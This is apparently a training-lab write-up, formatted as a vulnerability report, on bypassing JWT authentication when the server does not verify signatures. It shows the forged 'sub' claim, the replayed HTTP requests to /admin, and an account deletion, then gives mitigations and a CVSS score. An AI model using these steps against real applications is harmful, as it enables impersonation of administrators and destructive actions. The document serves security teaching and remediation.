# Title: JWT: JWT authentication bypass via unverified signature

## Description

The application uses JSON Web Tokens (JWTs) to manage authenticated user sessions. However, the server fails to verify the integrity and authenticity of JWT signatures before processing token claims.

Because signature verification is not enforced, attackers can modify JWT payload contents and submit forged tokens without possessing the signing key. The application trusts the manipulated claims and grants access based on attacker-controlled data.

In this case, modifying the `sub` (subject) claim allows an authenticated user to impersonate the administrator account and gain unauthorized access to administrative functionality.

---

## Steps to Exploit

### 1. Obtain a Valid JWT

1. Log in using valid credentials:

```text id="k3gvwu"
Username: wiener
Password: peter
```

2. Intercept a request to the account page.

Example:

```http id="9gx4jm"
GET /my-account HTTP/1.1
Cookie: session=<JWT>
```

3. Observe that the session cookie contains a JWT.

---

### 2. Analyze the Token

Decode the JWT payload.

Example:

```json id="jl0wov"
{
  "sub": "wiener",
  "iat": 1710000000
}
```

Notice that the `sub` claim identifies the currently authenticated user.

---

### 3. Test Administrative Access

Modify the request path:

```http id="4jibuv"
GET /admin HTTP/1.1
```

Send the request.

The application denies access because the current user is not an administrator.

---

### 4. Modify the JWT Payload

Change the value of the `sub` claim:

```json id="v4onrl"
{
  "sub": "administrator",
  "iat": 1710000000
}
```

The JWT signature remains invalid because it was not generated using the application's signing key.

However, due to the implementation flaw, the server does not validate the signature.

---

### 5. Replay the Forged Token

Send the modified JWT to the administrative endpoint:

```http id="zj0lc7"
GET /admin HTTP/1.1
Cookie: session=<modified_jwt>
```

The server grants access to the administrator panel.

---

### 6. Perform Administrative Actions

From the administrator panel, locate the user management functionality.

Example request:

```http id="pjlwmg"
GET /admin/delete?username=carlos HTTP/1.1
```

Submit the request.

The user account is deleted successfully.

---

## Proof of Concept

### Original JWT Payload

```json id="m6umtu"
{
  "sub": "wiener"
}
```

### Modified JWT Payload

```json id="jlwmj2"
{
  "sub": "administrator"
}
```

### Administrative Request

```http id="eysfij"
GET /admin HTTP/1.1
Cookie: session=<modified_jwt>
```

### Result

```text id="3mqj6n"
Administrative panel accessible
```

### Privileged Action

```http id="h0r2k3"
GET /admin/delete?username=carlos
```

The successful execution confirms authentication bypass and privilege escalation.

---

## Impact

* Authentication bypass.
* Privilege escalation to administrator level.
* Unauthorized access to administrative functionality.
* Manipulation or deletion of user accounts.
* Exposure of sensitive administrative data.
* Complete compromise of application authorization controls.

---

## Mitigation / Remediation

### 1. Enforce JWT Signature Verification

Always verify JWT signatures before processing claims.

Example:

```java id="vcjq3i"
JWTVerifier verifier = JWT.require(algorithm).build();
DecodedJWT jwt = verifier.verify(token);
```

---

### 2. Reject Invalid Tokens

Immediately reject:

* Invalid signatures
* Missing signatures
* Tampered payloads
* Unsupported algorithms

---

### 3. Validate Critical Claims

Verify claims such as:

```text id="ecvg6d"
sub
iss
aud
exp
nbf
iat
```

before authorizing access.

---

### 4. Implement Server-Side Authorization Checks

Do not rely solely on client-controlled JWT claims to determine authorization levels.

---

### 5. Use Secure JWT Libraries

Utilize maintained JWT libraries that enforce signature verification by default.

---

### 6. Conduct Security Reviews

Regularly assess authentication and authorization mechanisms for token validation weaknesses.

---

## CVSS Score

**CVSS v3.1 Score:** 9.1 (Critical)

**Vector:**

```text id="icmjbd"
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                 |
| ------------------- | --------- | --------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through HTTP requests    |
| Attack Complexity   | Low       | Requires only JWT modification                |
| Privileges Required | Low       | Requires a valid authenticated account        |
| User Interaction    | None      | No victim interaction required                |
| Scope               | Unchanged | Impact remains within the application         |
| Confidentiality     | High      | Administrative information becomes accessible |
| Integrity           | High      | Administrative actions can be performed       |
| Availability        | None      | No direct service disruption required         |

---

## Conclusion

The application is vulnerable to JWT authentication bypass because it fails to verify token signatures before processing claims. Attackers can modify JWT payload contents, impersonate privileged users, and gain unauthorized access to administrative functionality. Proper signature verification and server-side authorization checks are essential to prevent this class of vulnerability.
